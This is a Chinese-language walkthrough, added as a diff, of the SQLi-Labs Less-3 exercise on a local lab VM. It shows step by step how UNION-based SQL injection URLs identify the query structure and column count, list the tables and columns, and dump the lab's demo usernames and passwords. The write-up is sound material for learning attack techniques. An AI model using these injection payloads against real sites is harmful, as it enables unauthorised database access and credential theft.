@@ -1,0 +1,40 @@
+url:http://10.0.2.15/sqli/Less-3/?id=1
+显示：用户名和密码
+url:http://10.0.2.15/sqli/Less-3/?id=1%27
+显示：报错'  '1'') LIMIT 0,1  '
+即正常情况下（id=1）应是: ('1') limit 0,1
+推测sql：select username,password from 用户表 where id = ('用户输入') limit 0,1;
+
+验证：
+url:http://10.0.2.15/sqli/Less-3/?id=1%27)%20--%20
+显示：用户名和密码
+故说明推测成立
+
+拆解：
+1.字段数
+url：http://10.0.2.15/sqli/Less-3/?id=1') order by 3--+
+正常显示
+url：http://10.0.2.15/sqli/Less-3/?id=1') order by 4--+
+报错，字段数为3
+
+2.数据库名
+url：http://10.0.2.15/sqli/Less-2/?id=0
+没有返回用户名和密码，说明不含有id=0的记录
+url：http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,database(),3--+
+数据库名为security
+
+3.表名
+url：http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security'--+
+表名users,uagents,emails,referers
+推测有效信息在users中
+
+4.字段名
+url：http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users'--+
+字段名id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+推测username表示用户名，password表示密码
+
+5.字段值
+url：http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,group_concat(username),group_concat(password) from users--+
+Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
